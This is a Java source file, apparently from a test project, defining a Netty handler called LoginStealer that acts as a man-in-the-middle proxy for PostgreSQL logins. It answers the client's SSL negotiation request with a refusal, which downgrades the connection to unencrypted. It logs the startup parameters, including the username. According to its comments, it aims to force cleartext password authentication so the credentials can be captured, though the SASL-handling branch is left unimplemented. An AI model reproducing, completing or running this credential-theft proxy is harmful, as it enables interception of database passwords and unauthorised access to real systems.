package dev.bandarlog.test.netty.proxy.postgres.lean;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import javax.security.sasl.Sasl;

import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.ParameterStatus;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.StartupMessage;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse.AuthenticationResponseType;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;

/**
 * This class here implements the MITM logic:
 * <ul>
 * <li>Forces a ssl-less connection</li>
 * <li>Fakes a cleartext password connection</li>
 * <li>Forwards the stolen credentials to the server</li>
 * </ul>
 */
public class LoginStealer extends ChannelDuplexHandler {

	private static final ChannelFutureListener FIRE = ChannelFutureListener.FIRE_EXCEPTION_ON_FAILURE;
	
	private static final ByteBuf N = Unpooled.wrappedBuffer(new byte[] { 'N' });
	
	private Map<String, String> parameters;
	
	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {		
		if (msg instanceof StartupMessage) {
			final StartupMessage startup = (StartupMessage) msg;
			
			if (startup.getProtocolVersion() == StartupMessage.SSL_NEGOCIATION_PROTOCOL_VERSION) {
				// hijack.
				startup.release();
				
				ByteBuf no = N;
				no.retain();
				ctx.writeAndFlush(no).addListener(FIRE);
				ctx.read();
				
				return;
			} else if (startup.getProtocolVersion() == StartupMessage.CANCEL_REQUEST_PROTOCOL_VERSION) {
				// Nothing to do.
			} else {
				// read the username
				parameters = startup.getPayload();
				
				System.out.println("Startup message: " + parameters);
			}
		} else {
			System.out.println("Reading: " + msg);
		}
		
		super.channelRead(ctx, msg);
	}
	
	public enum AuthenticationState {
		NONE, // default value
		WAITING_FOR_CHALLENGE, // start has been sent, waiting for server challenge
		COMPLETED, // authenticated.
	}
	
	@Override
	public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {
		
		if (msg instanceof ParameterStatus) {
			final ParameterStatus parameterStatus = (ParameterStatus) msg;
			
			System.out.println("Parameter status: " + parameterStatus.getParameterName() + "=" + parameterStatus.getParameterValue());
		} else if (msg instanceof AuthenticationResponse) {
			final AuthenticationResponse response = (AuthenticationResponse) msg;
			
			System.out.println("Authentication response: " + response.getAuthenticationResponseType());
			
			// hijack the response to force cleartext
			
			if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL) {
				// shit.
				// send a cleartext 
				
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.CLEARTEXT) {
				// good
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.MD5) {
				// manageable
			}
		} else {
			System.out.println("Writing:" + msg);
		}
		
		super.write(ctx, msg, promise);
	}
}